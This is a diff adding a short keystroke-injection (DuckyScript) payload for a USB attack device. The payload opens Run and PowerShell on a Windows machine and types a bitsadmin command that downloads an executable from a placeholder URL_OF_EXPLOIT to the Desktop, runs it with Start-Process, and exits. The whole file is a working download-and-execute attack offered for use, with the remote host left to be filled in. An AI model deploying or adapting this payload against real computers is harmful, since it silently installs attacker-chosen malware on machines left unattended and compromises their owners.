@@ -1,0 +1,16 @@
+REM Description: Downloads an .exe file from the URL and runs it on the target pc.
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 950
+WINDOWS r
+DELAY 650
+STRING powershell
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 1200
+STRING cmd /c bitsadmin /transfer 8 URL_OF_EXPLOIT $HOME\Desktop\St.exe; Start-Process -FilePath $HOME\Desktop\St.exe; exit
+ENTER
